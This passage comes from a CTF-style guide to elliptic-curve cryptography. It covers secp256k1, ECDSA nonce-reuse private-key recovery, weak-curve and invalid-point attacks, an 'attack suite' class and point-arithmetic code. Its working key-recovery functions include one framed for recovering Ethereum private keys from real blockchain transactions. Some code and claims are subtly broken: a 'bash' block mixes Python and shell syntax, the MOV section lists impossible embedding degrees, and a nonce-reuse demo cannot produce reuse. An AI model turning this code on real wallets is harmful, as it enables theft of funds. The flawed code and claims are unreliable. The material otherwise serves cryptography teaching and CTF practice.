    Use for verifying shared secrets, MACs, etc.
    """
    if len(a) != len(b):
        return False
    
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y
    
    return result == 0

# For cryptographic operations in CTF challenges:
# Always use constant-time comparison to avoid timing leaks
```

---

### secp256k1

secp256k1 is the elliptic curve used in Bitcoin and Ethereum: `y² = x³ + 7` over prime field `p = 2²⁵⁶ - 2³² - 977`. While mathematically similar to NIST P-256, secp256k1 has different parameters enabling faster implementation on Bitcoin hardware.

#### secp256k1 Security Properties

**Curve Equation:** `y² = x³ + 7` (no coefficient for `x²` term simplifies arithmetic)

**Field:** `p = 2²⁵⁶ - 2³² - 977 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F`

**Order:** `n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141`

**Generator G:** Standard point (publicly documented)

**Cofactor:** 1 (simpler than Curve25519)

#### secp256k1 Vulnerabilities

**ECDSA Nonce Reuse (Critical):**

Bitcoin/Ethereum private keys compromised if same nonce used twice (same mechanism as ECDSA section). Multiple blockchain funds stolen historically via this vulnerability.

**Implementation-Specific Flaws:**

libsecp256k1 (Bitcoin standard) highly optimized but requires careful deployment. Older implementations had side-channel vulnerabilities (now patched).

**Invalid Curve Point Acceptance:**

Receiving invalid public key enables attacks if verification bypassed.

**Weak RNG in Key/Nonce Generation:**

Predictable nonce or private key derivation enables key recovery.

#### CTF Tools and Commands

**Python secp256k1 (ecdsa library with secp256k1):**

```bash
pip install ecdsa
```

```python
from ecdsa import SigningKey, VerifyingKey, SECP256k1
import hashlib

def secp256k1_signature():
    """
    ECDSA signing and verification with secp256k1.
    """
    # Generate keypair
    private_key = SigningKey.generate(curve=SECP256k1, hashfunc=hashlib.sha256)
    public_key = private_key.verifying_key
    
    # Sign message
    message = b"Bitcoin transaction"
    signature = private_key.sign(message, hashfunc=hashlib.sha256)
    print(f"Signature: {signature.hex()}")
    
    # Verify
    try:
        public_key.verify(signature, message, hashfunc=hashlib.sha256)
        print("Signature valid")
    except:
        print("Signature invalid")
    
    # Export private key (hex)
    d = private_key.privkey.secret_multiplier
    print(f"Private key (d): {hex(d)}")
    
    return private_key, public_key

# secp256k1_signature()
```

**secp256k1 via Web3.py (Ethereum Context):**

```bash
pip install web3
```

```python
from web3 import Web3
from eth_keys import keys
import hashlib

def ethereum_key_recovery():
    """
    Generate/recover Ethereum keys (secp256k1-based).
    """
    # Generate private key (32 random bytes)
    private_key_bytes = Web3.keccak(text="my seed phrase")  # or os.urandom(32)
    pk = keys.PrivateKey(private_key_bytes)
    
    # Derive public key and address
    public_key = pk.public_key
    address = public_key.to_checksum_address()
    
    print(f"Private Key: {pk.hex()}")
    print(f"Public Key: {public_key.hex()}")
    print(f"Address: {address}")
    
    # Sign message
    message_hash = Web3.keccak(text="message to sign")
    signature = pk.sign_msg_hash(message_hash)
    
    print(f"Signature: {signature.hex()}")
    
    # Recover public key from signature (Ethereum feature)
    recovered_address = Web3.eth.Account.recover_message(
        Web3.keccak(text="message to sign"), 
        signature=signature
    )
    print(f"Recovered Address: {recovered_address}")
    
    return pk, public_key, address

# ethereum_key_recovery()
```

**secp256k1 Nonce Reuse Attack (Blockchain Context):**

```python
from ecdsa import SECP256k1
import hashlib

def recover_ethereum_private_key_from_nonce_reuse(tx1_data, tx2_data):
    """
    Recover Ethereum private key if same nonce used in two transactions.
    
    tx_data format: {
        'message': bytes,
        'signature': bytes (64 bytes: r || s),
        'sighash': bytes (32-byte transaction hash)
    }
    """
    msg1, sig1, hash1 = tx1_data['message'], tx1_data['signature'], tx1_data['sighash']
    msg2, sig2, hash2 = tx2_data['message'], tx2_data['signature'], tx2_data['sighash']
    
    # Parse signatures
    r1 = int.from_bytes(sig1[:32], 'big')
    s1 = int.from_bytes(sig1[32:64], 'big')
    
    r2 = int.from_bytes(sig2[:32], 'big')
    s2 = int.from_bytes(sig2[32:64], 'big')
    
    if r1 != r2:
        print("Different r values: different nonces used")
        return None
    
    r = r1
    
    # Hash transaction data (Ethereum uses Keccak-256)
    z1 = int.from_bytes(hash1, 'big')
    z2 = int.from_bytes(hash2, 'big')
    
    n = SECP256k1.order
    
    # Recover nonce
    k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n
    
    # Recover private key
    d = (pow(r, -1, n) * (s1 * k - z1)) % n
    
    print(f"Private key recovered: {hex(d)}")
    return d

# Usage (requires actual transaction data from blockchain)
# recovered_key = recover_ethereum_private_key_from_nonce_reuse(tx1, tx2)
```

**Bitcoin Transaction Analysis (secp256k1):**

```bash
# Install Bitcoin analysis tools
pip install bitcoinlib

# Or manual transaction parsing
# Requires extracting r, s from transaction signature
# Format: [signature_hash][sighash_flag]
```

```python
def parse_bitcoin_signature(sig_bytes):
    """
    Parse Bitcoin transaction signature (DER-encoded).
    """
    # DER format: 0x30 [length] 0x02 [r_length] [r] 0x02 [s_length] [s]
    if sig_bytes[0] != 0x30:
        raise ValueError("Invalid DER signature")
    
    idx = 2  # Skip 0x30 and length
    
    if sig_bytes[idx] != 0x02:
        raise ValueError("Invalid r marker")
    idx += 1
    
    r_length = sig_bytes[idx]
    idx += 1
    r = int.from_bytes(sig_bytes[idx:idx+r_length], 'big')
    idx += r_length
    
    if sig_bytes[idx] != 0x02:
        raise ValueError("Invalid s marker")
    idx += 1
    
    s_length = sig_bytes[idx]
    idx += 1
    s = int.from_bytes(sig_bytes[idx:idx+s_length], 'big')
    
    return r, s

# Example: parse signatures from Bitcoin transactions
# sig1_r, sig1_s = parse_bitcoin_signature(raw_sig1)
# sig2_r, sig2_s = parse_bitcoin_signature(raw_sig2)
```

**Kali Linux: secp256k1 Command-Line Tool:**

```bash
# Install libsecp256k1
sudo apt install libsecp256k1-dev

# Or build from source (Bitcoin)
git clone https://github.com/bitcoin-core/secp256k1.git
cd secp256k1
./autogen.sh
./configure
make
sudo make install
```

**Testing for Weak RNG in Key Generation:**

```python
def detect_weak_rng_patterns(private_keys):
    """
    Detect if private keys show patterns indicating weak RNG.
    
    Signs: sequential values, low entropy, repeated bytes, etc.
    """
    for i in range(len(private_keys) - 1):
        diff = private_keys[i+1] - private_keys[i]
        if diff in [1, -1]:
            print(f"Sequential keys detected: {hex(private_keys[i])}")
        
        # Check for low-entropy prefixes
        if private_keys[i] < 2**128:
            print(f"Key with low-entropy prefix: {hex(private_keys[i])}")

# For CTF: if you see blockchain keys generated by same system,
# test if they follow patterns
```

---

### Practical ECC Attack Workflow for CTF

**Vulnerability Identification Phase:**

**ECDSA Challenge Checklist:**

```bash
# 1. Extract all signatures and messages from challenge
# Check if any r values repeat (nonce reuse)
signatures = [sig1, sig2, sig3, ...]
r_values = [sig[:32] for sig in signatures]

if len(r_values) != len(set(r_values)):
    echo "CRITICAL: Duplicate r values found - nonce reuse vulnerability!"
    # Proceed with nonce reuse attack
fi

# 2. Check for weak/short nonces (via side-channel or leak)
# If nonce bits are known: lattice attack potential

# 3. Test if public key lies on curve
openssl ec -in public_key.pem -text -noout | grep -i "pub:"
# Verify using point validation script
```

**ECDH Challenge Checklist:**

```bash
# 1. Check if multiple sessions use same long-term keypair
# 2. Verify curve order and cofactor (small subgroup risk)
# 3. Test if invalid curve points accepted (point validation bypass)
# 4. Check if shared secret derivation uses simple KDF (no HKDF)
# 5. Verify if key reuse enables multi-session analysis
```

**Curve Selection Analysis:**

```python
def analyze_curve_security(curve_name):
    """
    Assess curve for known vulnerabilities.
    """
    weak_curves = {
        'secp112r1': 'Small key size (112-bit), broken',
        'secp160r1': 'Small key size (160-bit), weak',
        'sect163r1': 'Binary curve, small, deprecated',
        'brainpool160r1': 'Small key size, weak',
    }
    
    strong_curves = {
        'secp256k1': 'Bitcoin standard, well-audited',
        'P-256': 'NIST standard, widely deployed',
        'Curve25519': 'Modern, side-channel resistant',
        'P-384': 'NIST standard, 384-bit',
        'P-521': 'NIST standard, 521-bit',
    }
    
    if curve_name in weak_curves:
        print(f"⚠️ WEAK CURVE: {weak_curves[curve_name]}")
        return False
    elif curve_name in strong_curves:
        print(f"✓ STRONG CURVE: {strong_curves[curve_name]}")
        return True
    else:
        print(f"? UNKNOWN CURVE: {curve_name}")
        return None

# analyze_curve_security('secp256k1')
# analyze_curve_security('secp112r1')
```

**Multi-Stage Recovery Strategy:**

```bash
# Stage 1: Rapid Assessment (< 1 minute)
# - Extract all parameters (curve, key size, algorithms)
# - Identify curve type and known vulnerabilities
# - Check for obvious patterns (weak keys, repeated r values)

# Stage 2: Targeted Exploitation (5-10 minutes)
# - If nonce reuse: execute key recovery
# - If weak curve: attempt discrete log via Pollard-rho or index calculus
# - If ECDH: test for small subgroup vulnerability

# Stage 3: Fallback Methods (10+ minutes)
# - Brute force (if key size ≤ 128 bits)
# - Lattice attacks (if partial nonce/key known)
# - Side-channel analysis (timing, power, cache)
# - Implementation flaws (null pointer dereference, buffer overflow)

# Stage 4: Verification
# - Recovered key: sign test message, verify against known signature
# - Recovered shared secret: decrypt test ciphertext
# - Invalid plaintext: loop back to Stage 2
```

---

### Advanced ECC Exploitation Techniques

**Pohlig-Hellman Attack (Weak Subgroup Orders):**

```python
def pohlig_hellman_attack(generator, public_key, curve_order):
    """
    [Unverified] If curve order is smooth (product of small primes),
    compute discrete log modulo each small prime, then combine via CRT.
    
    Complexity: O(√max_prime_factor) instead of O(√curve_order).
    """
    from sympy import factorint, integer_nthroot, isprime
    import math
    
    # Factor curve order
    factors = factorint(curve_order)
    print(f"Curve order factors: {factors}")
    
    # Check if smooth (product of small primes)
    largest_factor = max(factors.keys())
    if largest_factor < 2**20:
        print(f"⚠️ SMOOTH CURVE: Largest prime factor = {largest_factor}")
        print(f"Pohlig-Hellman complexity: O(√{largest_factor}) ≈ {int(math.sqrt(largest_factor))}")
        print("Attack feasible!")
        return True
    else:
        print(f"✓ Non-smooth curve: Largest prime factor = {largest_factor}")
        return False

def pohlig_hellman_recover_key(public_key, generator, curve_order, prime_factors):
    """
    Recover private key modulo each small prime, combine via CRT.
    
    [Unverified] Practical complexity remains high; requires custom implementation.
    """
    print("[Unverified] Full Pohlig-Hellman implementation requires:")
    print("1. Pollard-rho DL computation in each prime-factor subgroup")
    print("2. Chinese Remainder Theorem combining results")
    print("Estimated time: hours to days depending on largest factor")
    pass

# Test on weak curve
# curve_order = 0xFFFFFFFE00000001D8000000  # Example smooth order
# if pohlig_hellman_attack(G, public_key, curve_order):
#     print("Attempting key recovery...")
```

**MOV Attack (Small Embedding Degree):**

```python
def mov_attack_feasibility(curve_name, field_bits):
    """
    [Unverified] MOV attack reduces discrete log on elliptic curve
    to discrete log in multiplicative group of field extension.
    
    Feasibility depends on embedding degree k:
    - If k is small (< 10), attack may be practical
    - If k is large (> 100), attack infeasible
    """
    embedding_degrees = {
        'secp256k1': '>= 2^256',  # Very large, MOV infeasible
        'P-256': '>= 2^256',      # Very large, MOV infeasible
        'Curve25519': '>= 2^256', # Very large, MOV infeasible
        'supersingular_curve': '~ 2-6',  # Small, MOV feasible
    }
    
    print("[Unverified] MOV attack status for common curves:")
    for curve, k in embedding_degrees.items():
        print(f"  {curve}: embedding degree {k}")
    
    print("\n✓ Standard curves (secp256k1, P-256, Curve25519) are secure against MOV")
    print("⚠️ Supersingular curves vulnerable (rarely used in modern crypto)")

# mov_attack_feasibility('secp256k1', 256)
```

**Lattice-Based Discrete Log (Partial Information):**

```python
def lattice_based_dlog_attack(partial_key_bits, known_bits_count, curve_order):
    """
    [Unverified] If attacker knows high-order bits of private key d
    (e.g., via side-channel), LLL lattice reduction may recover full key.
    
    Complexity depends on known_bits_count:
    - If >= 50% known: recovery often feasible
    - If < 30% known: infeasible with current techniques
    """
    print(f"[Unverified] Partial key recovery via lattice reduction:")
    print(f"  Known bits: {known_bits_count}")
    print(f"  Total key size: {curve_order.bit_length()}")
    print(f"  Coverage: {100 * known_bits_count / curve_order.bit_length():.1f}%")
    
    if known_bits_count >= 0.5 * curve_order.bit_length():
        print("  ✓ Recovery likely feasible (LLL-based)")
    elif known_bits_count >= 0.3 * curve_order.bit_length():
        print("  ? Recovery may be feasible with optimized algorithms")
    else:
        print("  ✗ Recovery infeasible with current techniques")

# lattice_based_dlog_attack(b'leaked_nonce_bits', 100, SECP256k1.order)
```

**Invalid Curve Point Injection:**

```python
def invalid_curve_point_exploit():
    """
    [Unverified] If ECDH verifier doesn't validate received public key,
    attacker sends point on different curve with same field.
    
    Verification succeeds on wrong curve if implementation doesn't check.
    Enables manipulation of shared secret.
    """
    print("[Unverified] Invalid curve point attack:")
    print("1. Attacker sends point not on agreed curve")
    print("2. If verifier skips validation, computation proceeds on wrong curve")
    print("3. Shared secret controlled by attacker")
    print("4. Session decryption compromised")
    print("\nMitigation: Always validate received public key is on curve")
    print("  if y² ≠ x³ + ax + b (mod p): reject point")

# invalid_curve_point_exploit()
```

**Timing Side-Channel Analysis (Theory):**

```python
def timing_sidechannel_dlog_recovery():
    """
    [Unverified] If ECDH implementation has timing variation based on key bits,
    attacker measures response time for crafted public keys to deduce key bits.
    
    Requires: precise timing measurements, network latency < microseconds,
    multiple queries to same ephemeral key.
    """
    print("[Unverified] Timing side-channel discrete log recovery:")
    print("- Requires microsecond-precision timing measurement")
    print("- Network/RPC-based attacks: millisecond latency masks microsecond variations")
    print("- Local attacks (same process/VM): more feasible")
    print("- Practical primarily against non-constant-time implementations")
    print("\nConstant-time implementations (Curve25519, modern libsecp256k1): resistant")

# timing_sidechannel_dlog_recovery()
```

---

### ECC CTF Challenge Examples and Solutions

**Example 1: Nonce Reuse in ECDSA**

```python
# Challenge scenario: Two signed messages, same nonce k used
from ecdsa import SECP256k1, SigningKey
import hashlib

def ecdsa_nonce_reuse_ctf():
    """
    CTF Challenge: Given two signatures from same key with nonce reuse,
    recover the private key.
    """
    # Setup (given in challenge)
    curve = SECP256k1
    
    msg1 = b"message1"
    msg2 = b"message2"
    
    # Simulated leaked signatures (same nonce k)
    # In real CTF: extract from challenge
    private_key = SigningKey.generate(curve=curve, hashfunc=hashlib.sha256)
    
    sig1 = private_key.sign(msg1, hashfunc=hashlib.sha256)
    sig2 = private_key.sign(msg2, hashfunc=hashlib.sha256)
    
    # Extract r, s
    r1 = int.from_bytes(sig1[:32], 'big')
    s1 = int.from_bytes(sig1[32:64], 'big')
    
    r2 = int.from_bytes(sig2[:32], 'big')
    s2 = int.from_bytes(sig2[32:64], 'big')
    
    print(f"Signature 1: r={hex(r1)}, s={hex(s1)}")
    print(f"Signature 2: r={hex(r2)}, s={hex(s2)}")
    
    if r1 == r2:
        print("✓ Identical r values detected: NONCE REUSE!")
        
        # Recover nonce
        z1 = int.from_bytes(hashlib.sha256(msg1).digest(), 'big')
        z2 = int.from_bytes(hashlib.sha256(msg2).digest(), 'big')
        
        n = curve.order
        r = r1
        
        k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n
        print(f"Recovered nonce k: {hex(k)}")
        
        # Recover private key
        d = (pow(r, -1, n) * (s1 * k - z1)) % n
        print(f"Recovered private key d: {hex(d)}")
        
        # Verify
        recovered_key = SigningKey.from_secret_exponent(d, curve=curve, hashfunc=hashlib.sha256)
        if recovered_key.verifying_key.to_string() == private_key.verifying_key.to_string():
            print("✓✓✓ Private key successfully recovered!")
            return d
    else:
        print("Different r values: different nonces (no vulnerability)")
        return None

# recovered = ecdsa_nonce_reuse_ctf()
```

**Example 2: Small Subgroup Attack on ECDH**

```python
# Challenge scenario: ECDH with cofactor-8 curve, attacker can send crafted public keys
def small_subgroup_attack_ctf():
    """
    CTF Challenge: Recover shared secret via cofactor attack.
    
    Assumes: multiple sessions, attacker can send public keys,
    attacker can observe if session succeeds (e.g., MAC verification).
    """
    print("Small Subgroup Attack (Cofactor-8 Curve):")
    print("1. Attacker crafts 8 possible ephemeral public keys (order-dividing cofactors)")
    print("2. Sends each as ephemeral public key in separate session")
    print("3. For each session, attempts to derive session key and verify MAC")
    print("4. MAC verification success indicates which cofactor was used")
    print("5. Repeat for each bit of private key via CRT")
    print("\n[Unverified] Complexity: 8 queries per session (vs 2^256 brute force)")
    print("Mitigation: Cofactor clearing, point validation")

# small_subgroup_attack_ctf()
```

**Example 3: Weak Curve Order (Pohlig-Hellman)**

```python
# Challenge scenario: Curve with smooth order (product of small primes)
def weak_curve_order_ctf():
    """
    CTF Challenge: Recover private key from smooth curve order.
    """
    from sympy import factorint
    
    # Example smooth curve order
    n = 2**64 * 3**32 * 5**20 * 7**10  # Highly composite (unrealistic but illustrative)
    
    factors = factorint(n)
    print(f"Curve order factors: {factors}")
    
    largest_factor = max(factors.keys())
    print(f"Largest prime factor: {largest_factor} (~{largest_factor.bit_length()} bits)")
    
    if largest_factor < 2**40:
        print("✓ VULNERABLE: Discrete log in each subgroup feasible")
        print(f"Attack complexity per prime: O(√{largest_factor})")
    else:
        print("✗ Not vulnerable: Largest factor too large")

# weak_curve_order_ctf()
```

**Example 4: Invalid Curve Point Bypass**

```python
# Challenge scenario: ECDH implementation doesn't validate public key on curve
def invalid_curve_point_ctf():
    """
    CTF Challenge: Forge shared secret by sending invalid curve point.
    
    Requires: Point not on original curve but valid for field arithmetic.
    """
    print("Invalid Curve Point Attack:")
    print("1. Attacker crafts point (x, y) not on curve")
    print("2. Sends as ephemeral public key")
    print("3. If verifier skips validation: computation proceeds on wrong curve")
    print("4. Shared secret: attacker_ephemeral * victim_secret")
    print("5. But computed modulo wrong curve: may yield different result")
    print("\n[Inference] Requires vulnerability in ECDH implementation")
    print("Modern libraries validate point on curve before operations")

# invalid_curve_point_ctf()
```

---

### Reference Implementation: Complete ECC Attack Suite

```python
#!/usr/bin/env python3
"""
ECC CTF Attack Suite: Comprehensive tools for ECDSA/ECDH exploitation.
"""

from ecdsa import SECP256k1, SigningKey, VerifyingKey
from ecdsa.ellipticcurve import Point
import hashlib
import sys

class ECCAttackSuite:
    def __init__(self, curve=SECP256k1):
        self.curve = curve
        self.G = curve.generator
        self.n = curve.order
        self.p = curve.curve.p()
    
    def nonce_reuse_attack(self, msg1, sig1, msg2, sig2):
        """Recover private key from nonce reuse."""
        r1 = int.from_bytes(sig1[:32], 'big')
        s1 = int.from_bytes(sig1[32:64], 'big')
        r2 = int.from_bytes(sig2[:32], 'big')
        s2 = int.from_bytes(sig2[32:64], 'big')
        
        if r1 != r2:
            print("[!] Different r values: no nonce reuse")
            return None
        
        z1 = int.from_bytes(hashlib.sha256(msg1).digest(), 'big')
        z2 = int.from_bytes(hashlib.sha256(msg2).digest(), 'big')
        
        r = r1
        k = ((z1 - z2) * pow(s1 - s2, -1, self.n)) % self.n
        d = (pow(r, -1, self.n) * (s1 * k - z1)) % self.n
        
        print(f"[+] Nonce reuse detected!")
        print(f"[+] Recovered nonce k: {hex(k)}")
        print(f"[+] Recovered private key d: {hex(d)}")
        
        return d
    
    def point_on_curve(self, x, y):
        """Verify point (x, y) lies on curve."""
        y_squared = (y * y) % self.p
        rhs = (x**3 + 7) % self.p  # For secp256k1
        return y_squared == rhs
    
    def known_nonce_attack(self, msg, sig, nonce_k):
        """Recover private key when nonce is known."""
        r = int.from_bytes(sig[:32], 'big')
        s = int.from_bytes(sig[32:64], 'big')
        z = int.from_bytes(hashlib.sha256(msg).digest(), 'big')
        
        d = (pow(r, -1, self.n) * (s * nonce_k - z)) % self.n
        
        print(f"[+] Private key recovered: {hex(d)}")
        return d
    
    def verify_private_key(self, private_key_int, known_vk):
        """Verify recovered private key matches known verifying key."""
        sk = SigningKey.from_secret_exponent(private_key_int, curve=self.curve)
        vk = sk.verifying_key
        
        if vk.to_string() == known_vk.to_string():
            print("[✓] Private key verified!")
            return True
        else:
            print("[✗] Private key does not match")
            return False

# Usage in CTF
if __name__ == "__main__":
    suite = ECCAttackSuite()
    
    # Example: nonce reuse
    sk = SigningKey.generate(curve=SECP256k1, hashfunc=hashlib.sha256)
    vk = sk.verifying_key
    
    msg1 = b"test1"
    msg2 = b"test2"
    
    sig1 = sk.sign(msg1, hashfunc=hashlib.sha256)
    sig2 = sk.sign(msg2, hashfunc=hashlib.sha256)
    
    # In real CTF: signatures have nonce reuse, not generated separately
    # recovered_d = suite.nonce_reuse_attack(msg1, sig1, msg2, sig2)
    # suite.verify_private_key(recovered_d, vk)
```

---

### CTF Checklist: ECC Challenges

```
[ ] Identify curve type (secp256k1, P-256, Curve25519, custom)
[ ] Extract all cryptographic parameters (curve equation, field, order, generator)
[ ] Check curve for known weaknesses (small order, large embedding degree)
[ ] For ECDSA: search for duplicate r values (nonce reuse)
[ ] For ECDSA: check nonce generation (weak RNG, sequential, leaked bits)
[ ] For ECDH: test point validation (invalid curve points accepted?)
[ ] For ECDH: check key reuse across multiple sessions
[ ] Test for side-channel information (timing, power)
[ ] Verify public key lies on claimed curve
[ ] Attempt known plaintext attacks (if ECDH used for encryption)
[ ] Check for implementation flaws (null pointer, buffer overflow, integer overflow)
[ ] Document all findings: vulnerability type, exploitation method, complexity estimate
[ ] Implement targeted attack, verify with test vectors
[ ] Execute attack, recover private key or shared secret
[ ] Validate recovered material (sign test message, decrypt test ciphertext)
```

### Point Doubling & Addition

Elliptic curve operations form the foundation of ECC. Points on a curve are added using geometric or algebraic formulas, with point doubling being a special case of addition.

**Elliptic Curve Equations**

```
Weierstrass Form (short): y² = x³ + ax + b (mod p)
Montgomery Form: By² = x³ + Ax² + x (mod p)
Edwards Form: x² + y² = 1 + dx²y² (mod p)

Most common in CTF: Weierstrass short form over prime field Fp
```

**Point Addition Formulas**

```python
# ecc_point_operations.py
class EllipticCurve:
    """Elliptic curve over prime field Fp: y² = x³ + ax + b (mod p)"""
    
    def __init__(self, a, b, p):
        self.a = a
        self.b = b
        self.p = p
        
        # Verify curve is non-singular: 4a³ + 27b² ≠ 0 (mod p)
        discriminant = (4 * pow(a, 3, p) + 27 * pow(b, 2, p)) % p
        if discriminant == 0:
            raise ValueError("Curve is singular (invalid)")
    
    def is_on_curve(self, point):
        """Verify point satisfies curve equation"""
        if point is None:  # Point at infinity
            return True
        
        x, y = point
        left = pow(y, 2, self.p)
        right = (pow(x, 3, self.p) + self.a * x + self.b) % self.p
        return left == right
    
    def point_add(self, P, Q):
        """
        Add two points on the curve
        Special cases:
        - P + O = P (O is point at infinity)
        - P + (-P) = O
        - P + P = point doubling
        """
        # Point at infinity cases
        if P is None:
            return Q
        if Q is None:
            return P
        
        x1, y1 = P
        x2, y2 = Q
        
        # Check if points are inverses: P + (-P) = O
        if x1 == x2 and (y1 + y2) % self.p == 0:
            return None  # Point at infinity
        
        # Point doubling: P + P
        if P == Q:
            return self.point_double(P)
        
        # General point addition: P + Q where P ≠ Q
        # Slope: λ = (y2 - y1) / (x2 - x1) mod p
        numerator = (y2 - y1) % self.p
        denominator = (x2 - x1) % self.p
        
        # Modular inverse using Fermat's little theorem: a^(-1) = a^(p-2) mod p
        lambda_slope = (numerator * pow(denominator, self.p - 2, self.p)) % self.p
        
        # x3 = λ² - x1 - x2 (mod p)
        x3 = (pow(lambda_slope, 2, self.p) - x1 - x2) % self.p
        
        # y3 = λ(x1 - x3) - y1 (mod p)
        y3 = (lambda_slope * (x1 - x3) - y1) % self.p
        
        return (x3, y3)
    
    def point_double(self, P):
        """
        Double a point: P + P = 2P
        Special slope formula for tangent line
        """
        if P is None:
            return None
        
        x1, y1 = P
        
        # Check if y1 = 0 (tangent is vertical, result is infinity)
        if y1 == 0:
            return None
        
        # Slope: λ = (3x₁² + a) / (2y₁) mod p
        numerator = (3 * pow(x1, 2, self.p) + self.a) % self.p
        denominator = (2 * y1) % self.p
        
        lambda_slope = (numerator * pow(denominator, self.p - 2, self.p)) % self.p
        
        # x3 = λ² - 2x1 (mod p)
        x3 = (pow(lambda_slope, 2, self.p) - 2 * x1) % self.p
        
        # y3 = λ(x1 - x3) - y1 (mod p)
        y3 = (lambda_slope * (x1 - x3) - y1) % self.p
        
        return (x3, y3)
    
    def scalar_mult(self, k, P):
        """
        Scalar multiplication: k*P = P + P + ... + P (k times)
        Uses double-and-add algorithm for efficiency
        """
        if k == 0:
            return None  # Point at infinity
        
        if k < 0:
            # Negative scalar: -k*P = k*(-P)
            k = -k
            P = self.point_negate(P)
        
        # Double-and-add algorithm
        result = None  # Start with point at infinity
        addend = P
        
        while k:
            if k & 1:  # If bit is 1, add current point
                result = self.point_add(result, addend)
            addend = self.point_double(addend)  # Double for next bit
            k >>= 1
        
        return result
    
    def point_negate(self, P):
        """Negate a point: -P = (x, -y)"""
        if P is None:
            return None
        x, y = P
        return (x, (-y) % self.p)

# Example usage
# Curve: y² = x³ + 2x + 3 (mod 97)
curve = EllipticCurve(a=2, b=3, p=97)

# Define points
P = (17, 10)
Q = (95, 31)

print(f"Point P on curve: {curve.is_on_curve(P)}")
print(f"Point Q on curve: {curve.is_on_curve(Q)}")

# Point addition
R = curve.point_add(P, Q)
print(f"\nP + Q = {R}")
print(f"Result on curve: {curve.is_on_curve(R)}")

# Point doubling
P2 = curve.point_double(P)
print(f"\n2P = {P2}")

# Scalar multiplication
k = 5
kP = curve.scalar_mult(k, P)
print(f"\n5P = {kP}")

# Verify: 5P = P + P + P + P + P
manual = P
for _ in range(4):
    manual = curve.point_add(manual, P)
print(f"Manual 5P = {manual}")
print(f"Match: {kP == manual}")
```

**Point Order and Curve Order**

```python
# point_order.py
def find_point_order(curve, P):
    """
    Find order of point P: smallest n such that nP = O (infinity)
    
    [Inference: Order divides curve order by Lagrange's theorem]
    """
    if not curve.is_on_curve(P):
        raise ValueError("Point not on curve")
    
    result = P
    order = 1
    
    # Iterate until we reach point at infinity
    while result is not None:
        result = curve.point_add(result, P)
        order += 1
        
        if order > curve.p + 100:  # Safety limit
            print("[Inference: Order exceeds reasonable limit, may be curve order]")
            break
    
    return order

def count_curve_points_naive(curve, verbose=False):
    """
    Count points on curve (naive method, slow for large p)
    
    Real curves use Schoof's algorithm for efficient point counting
    [Unverified: Schoof's algorithm complexity O(log^8 p)]
    """
    count = 1  # Point at infinity
    
    for x in range(curve.p):
        # Calculate y² = x³ + ax + b (mod p)
        y_squared = (pow(x, 3, curve.p) + curve.a * x + curve.b) % curve.p
        
        # Check if y_squared is a quadratic residue (has square root)
        # Using Euler's criterion: a^((p-1)/2) ≡ 1 (mod p) if a is QR
        if pow(y_squared, (curve.p - 1) // 2, curve.p) == 1:
            # Two points: (x, y) and (x, -y)
            count += 2
            if verbose:
                # Find actual y values
                y = tonelli_shanks(y_squared, curve.p)
                print(f"Points: ({x}, {y}) and ({x}, {(-y) % curve.p})")
        elif y_squared == 0:
            # One point: (x, 0)
            count += 1
            if verbose:
                print(f"Point: ({x}, 0)")
    
    return count

def tonelli_shanks(n, p):
    """
    Find square root of n modulo p using Tonelli-Shanks algorithm
    Returns r such that r² ≡ n (mod p)
    """
    # Handle special cases
    if n == 0:
        return 0
    if pow(n, (p - 1) // 2, p) != 1:
        raise ValueError("n is not a quadratic residue")
    
    # Find Q and S such that p - 1 = Q * 2^S with Q odd
    Q = p - 1
    S = 0
    while Q % 2 == 0:
        Q //= 2
        S += 1
    
    # Find quadratic non-residue z
    z = 2
    while pow(z, (p - 1) // 2, p) != p - 1:
        z += 1
    
    # Initialize variables
    M = S
    c = pow(z, Q, p)
    t = pow(n, Q, p)
    R = pow(n, (Q + 1) // 2, p)
    
    while True:
        if t == 0:
            return 0
        if t == 1:
            return R
        
        # Find lowest i such that t^(2^i) = 1
        i = 1
        temp = (t * t) % p
        while temp != 1:
            temp = (temp * temp) % p
            i += 1
        
        # Update values
        b = pow(c, 1 << (M - i - 1), p)
        M = i
        c = (b * b) % p
        t = (t * c) % p
        R = (R * b) % p

# Example: Find order of point
curve = EllipticCurve(a=2, b=3, p=97)
P = (17, 10)

order = find_point_order(curve, P)
print(f"Order of point P: {order}")

# Count curve points
curve_order = count_curve_points_naive(curve)
print(f"Curve order (total points): {curve_order}")
print(f"Point order divides curve order: {curve_order % order == 0}")
```

**Standard Curves (secp256k1, P-256)**

```python
# standard_curves.py
class StandardCurves:
    """Common elliptic curves used in cryptography"""
    
    @staticmethod
    def secp256k1():
        """
        Bitcoin curve (secp256k1)
        y² = x³ + 7 (mod p)
        """
        p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
        a = 0
        b = 7
        
        # Generator point
        Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
        Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
        G = (Gx, Gy)
        
        # Curve order (number of points)
        n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
        
        return EllipticCurve(a, b, p), G, n
    
    @staticmethod
    def p256():
        """
        NIST P-256 (secp256r1)
        y² = x³ - 3x + b (mod p)
        """
        p = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
        a = p - 3  # -3 mod p
        b = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B
        
        Gx = 0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296
        Gy = 0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5
        G = (Gx, Gy)
        
        n = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
        
        return EllipticCurve(a, b, p), G, n

# Using standard curves
curve, G, n = StandardCurves.secp256k1()
print("secp256k1 Generator:")
print(f"G = ({hex(G[0])}, {hex(G[1])})")
